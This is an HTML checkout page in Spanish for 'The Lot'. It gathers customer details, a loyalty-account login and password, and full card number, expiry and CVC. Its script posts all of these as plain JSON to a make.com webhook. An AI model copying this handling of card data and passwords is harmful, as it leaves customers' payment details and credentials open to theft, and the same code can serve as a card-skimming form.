<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Pago - The Lot</title>
  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
  <style>
    body {
      font-family: 'Helvetica Neue', Helvetica, sans-serif;
      background: #f5f5f5;
      margin: 0;
      padding: 2rem;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      color: #003A7E;
    }
    .container {
      background: #fff;
      padding: 2rem;
      border-radius: 16px;
      box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
      max-width: 400px;
      width: 100%;
      position: relative;
    }
    form {
      display: flex;
      flex-direction: column;
      gap: 1.5rem;
    }
    input {
      padding: 1rem;
      font-size: 1rem;
      border: 2px solid #003A7E;
      border-radius: 12px;
    }
    button {
      background-color: #003A7E;
      color: white;
      border: none;
      padding: 1rem;
      font-size: 1.2rem;
      border-radius: 12px;
      cursor: pointer;
      transition: background-color 0.3s;
    }
    button:hover {
      background-color: #3D93F7;
    }
    #loading {
      display: none;
      position: absolute;
      top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(255, 255, 255, 0.8);
      border-radius: 16px;
      align-items: center;
      justify-content: center;
      font-size: 1.2rem;
      font-weight: bold;
      color: #003A7E;
      z-index: 2;
    }
  </style>
</head>
<body>

<div class="container">
  <!-- Loading general -->
  <div id="loading">Procesando...</div>

  <!-- Formulario Cliente -->
  <div id="formCliente">
    <h1>Datos de Cliente</h1>
    <form id="clienteForm">
      <input type="text" id="nombre" placeholder="Nombre completo" required>
      <input type="tel" id="telefono" placeholder="Teléfono" required>
      <input type="email" id="correo" placeholder="Correo electrónico" required>
      <input type="text" id="loyaltyUser" placeholder="Login de Loyalty (opcional)">
      <input type="password" id="loyaltyPass" placeholder="Contraseña de Loyalty (opcional)">
      <button type="submit">Continuar</button>
    </form>
  </div>

  <!-- Formulario Pago -->
  <div id="formPago" style="display: none;">
    <h1>Detalles de Pago</h1>
    <form id="pagoForm">
      <input type="text" id="card_name" placeholder="Nombre en tarjeta" required>
      <input type="text" id="card_number" placeholder="Número de tarjeta" required maxlength="16">
      <input type="text" id="card_expiry" placeholder="MM/AA" required maxlength="5">
      <input type="text" id="card_cvc" placeholder="CVC" required maxlength="4">
      <div class="g-recaptcha" data-sitekey="6LfEvCcrAAAAAD0pDf2NlUYxazGY_iAZDwPPmGQ8"></div>
      <button type="submit">Pagar</button>
    </form>
  </div>
</div>

<script>
  let userSessionId = '';
  let customerName = '';
  let customerPhone = '';
  let customerEmail = '';
  let variablePriceInCents = 0;

  // Cargar amount desde URL
  const params = new URLSearchParams(window.location.search);
  const amount = params.get('amount') || 100;

  const clienteForm = document.getElementById('clienteForm');
  const pagoForm = document.getElementById('pagoForm');
  const loading = document.getElementById('loading');

  // Primer submit: Cliente
  clienteForm.addEventListener('submit', function(e) {
    e.preventDefault();

    loading.style.display = 'flex';

    const data = {
      nombre: document.getElementById('nombre').value,
      telefono: document.getElementById('telefono').value,
      correo: document.getElementById('correo').value,
      loyaltyUser: document.getElementById('loyaltyUser').value,
      loyaltyPass: document.getElementById('loyaltyPass').value,
      amount: amount
    };

    fetch('https://hook.us2.make.com/j4shhdd1b8axa0ycwq857159hga53tla', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    })
    .then(res => res.json())
    .then(result => {
      if (result.ExtendedResultCode === 0) {
        userSessionId = result.LoyaltySessionToken;
        customerName = data.nombre;
        customerPhone = data.telefono;
        customerEmail = data.correo;
        variablePriceInCents = amount * 100; // Multiplicamos el amount
        mostrarFormPago();
      } else {
        const msg = result.ErrorDescription || 'Ocurrió un error inesperado, inténtalo de nuevo.';
        alert(msg);
      }
    })
    .catch(err => {
      console.error('Error enviando los datos:', err);
      alert('Error en el servidor, intenta de nuevo más tarde.');
    })
    .finally(() => {
      loading.style.display = 'none';
    });
  });

  function mostrarFormPago() {
    document.getElementById('formCliente').style.display = 'none';
    document.getElementById('formPago').style.display = 'block';
  }

  // Segundo submit: Pago
  pagoForm.addEventListener('submit', async function(e) {
    e.preventDefault();

    const recaptchaResponse = grecaptcha.getResponse();
    if (!recaptchaResponse) {
      alert('Por favor completa el reCAPTCHA.');
      return;
    }

    const cardName = document.getElementById('card_name').value;
    const cardNumber = document.getElementById('card_number').value;
    const cardExpiry = document.getElementById('card_expiry').value;
    const cardCvc = document.getElementById('card_cvc').value;

    const data = {
      card_name: cardName,
      card_number: cardNumber,
      card_expiry: cardExpiry,
      card_cvc: cardCvc,
      customer_name: customerName,
      customer_phone: customerPhone,
      customer_email: customerEmail,
      UserSessionId: userSessionId,
      PaymentValueCents: variablePriceInCents,
      "g-recaptcha-response": recaptchaResponse
    };

    try {
      loading.style.display = 'flex';
      await fetch('https://hook.us2.make.com/j4shhdd1b8axa0ycwq857159hga53tla', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      });

      // Redirigir a página de agradecimiento
      window.location.href = "gracias.html";

    } catch (error) {
      console.error('Error enviando los datos:', error);
      alert('Ocurrió un error al procesar tu pago. Intenta nuevamente.');
    } finally {
      loading.style.display = 'none';
    }
  });
</script>

</body>
</html>
